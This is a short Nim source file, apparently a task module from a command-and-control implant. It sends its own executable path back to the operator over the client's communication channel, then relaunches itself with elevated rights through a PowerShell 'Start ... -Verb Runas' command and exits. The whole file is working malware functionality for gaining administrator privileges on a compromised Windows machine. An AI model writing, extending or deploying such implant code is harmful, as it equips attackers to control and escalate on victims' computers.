import os, osproc
import ../client/[communication, types]

proc executeTask*(app: App, taskId: int, params: seq[string]) =
  let taskOutput = newTaskOutput taskId

  var filePath = getAppFileName()

  taskOutput.addData(Text, "path", "Current app path is: " & filePath)
  app.sendOutput(taskOutput)
  
  discard execCmdEx(
    "Powershell.exe Start " & filePath & " -Verb Runas",
    options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon}
  )

  quit()